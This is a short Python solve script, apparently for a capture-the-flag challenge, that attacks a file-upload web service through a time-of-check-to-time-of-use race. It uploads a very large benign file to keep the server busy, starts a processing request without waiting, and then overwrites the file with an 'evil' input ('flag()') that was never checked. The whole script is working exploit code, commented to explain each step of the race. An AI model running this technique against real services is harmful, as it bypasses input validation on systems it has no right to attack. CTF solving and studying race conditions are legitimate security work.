import asyncio
from io import BytesIO
import aiohttp
import sys

from aiohttp.client import ClientSession

url = sys.argv[1]

async def process_file(session: ClientSession):
    endpoint = f"{url}/process?filename=test2.txt"
    async with session.get(endpoint) as response:
        resp = await response.text()
        print(resp)
        if "flag" in resp.lower():
            print(resp)
        elif response.status == 400:
            print("rejected")
        else:
            print("didnt work")


async def upload(session: ClientSession, content: str):
    endpoint = f"{url}/"
    formdata = aiohttp.FormData()
    formdata.add_field('file', BytesIO(content.encode()), filename='test2.txt')

    async with session.post(endpoint, data=formdata) as response:
        await response.text()


async def main():
    async with aiohttp.ClientSession() as session:
        await upload(session, "good input"*999999) # send a large file, make the server busy hashing it when it does processing
        u =  asyncio.create_task(process_file(session)) # request to process the file, but don't block the solve script
        await upload(session, "flag()") # upload the evil input hoping that it finished the initial check - abuse TOCTOU
        await u


if __name__ == "__main__":
    asyncio.run(main())

